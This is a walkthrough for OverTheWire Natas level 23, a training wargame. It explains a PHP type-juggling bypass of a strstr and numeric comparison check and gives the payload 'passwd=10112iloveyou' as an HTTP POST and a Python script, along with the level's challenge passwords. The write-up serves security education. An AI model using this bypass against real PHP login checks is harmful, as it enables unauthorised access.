# Natas CTF Solutions  

## Natas Level 23  

### 🌐 **Challenge Description**  
Natas teaches the basics of server-side web security. Each level consists of a website located at:  
👉 `http://natasX.natas.labs.overthewire.org` (where **X** is the level number).  

---

### 🎯 **Goal**  
- Bypass the `strstr()` and numeric comparison conditions to reveal the password.  

---

## 🚀 **Solution**  

### **Step 1: Open the URL**  
Visit:  
```  
http://natas23.natas.labs.overthewire.org  
```  

---

### **Step 2: Enter Login Credentials**  
- **Username:** `natas23`  
- **Password:** Use the password from Natas Level 22:  
```
dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs
```  

![Home_Page](https://github.com/user-attachments/assets/b1de928a-77dc-46de-9851-3bc149de04b4)

---

### **Step 3: Analyze the Source Code**  
Key parts of the code:  
```php
if(strstr($_REQUEST["passwd"],"iloveyou") && $_REQUEST["passwd"] > 10) {
    print "Access granted. The password for natas24 is: XXXXX";
}
else {
    print "Access denied.";
}
```

- `strstr()` requires the string `"iloveyou"` to be present in the password.  
- The condition `$_REQUEST["passwd"] > 10` checks if the password is greater than `10` as a numeric value.  
- A string like `"10112iloveyou"` satisfies both conditions because:
  - `"iloveyou"` is present in the string.
  - `10112` is treated as a numeric value and is greater than `10`.  

![Source_Code](https://github.com/user-attachments/assets/daf91797-a293-41ed-b4e1-ac3839c821ff)

---

### **Step 4: Submit Payload**  
Send a POST request with the following data:  

```http
POST /index.php HTTP/1.1
Host: natas23.natas.labs.overthewire.org
Content-Type: application/x-www-form-urlencoded

passwd=10112iloveyou
```

✅ Example in Python:  
```python
import requests
from requests.auth import HTTPBasicAuth

username = "natas23"
password = "dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs"

url = "http://natas23.natas.labs.overthewire.org"
payload = {'passwd': '10112iloveyou'}

response = requests.post(url, auth=(username, password), data=payload)
print(response.text)
```

---

### **Step 5: Output**  
If successful, the output will reveal the password for the next level:  
```  
The password for natas24 is: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd  
```  

![Password](https://github.com/user-attachments/assets/4ce6fc66-8c66-42ca-890b-3a23bb990e91)

---

### **✅ Password for Natas Level 24**  
```
MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
```  

---

## 💡 **Lessons Learned**  
✔️ **Type Juggling:** PHP loosely compares values, leading to bypass opportunities.  
✔️ **String Matching:** `strstr()` can be exploited by injecting the required substring.  
✔️ **Injection Through Numeric Values:** Mixing numeric and string values can confuse PHP’s comparison behavior.  

---

## 🖼️ **Screenshots**  
| Step | Screenshot |  
|------|------------|  
| Step 3 – Source Code | ![Source_Code](https://github.com/user-attachments/assets/daf91797-a293-41ed-b4e1-ac3839c821ff) |  
| Step 4 – Found Password | ![Password](https://github.com/user-attachments/assets/4ce6fc66-8c66-42ca-890b-3a23bb990e91) |  

---

## 🎯 **Next Level**  
Use the password to access **Natas Level 24**:  
👉 [http://natas24.natas.labs.overthewire.org](http://natas24.natas.labs.overthewire.org)  

---
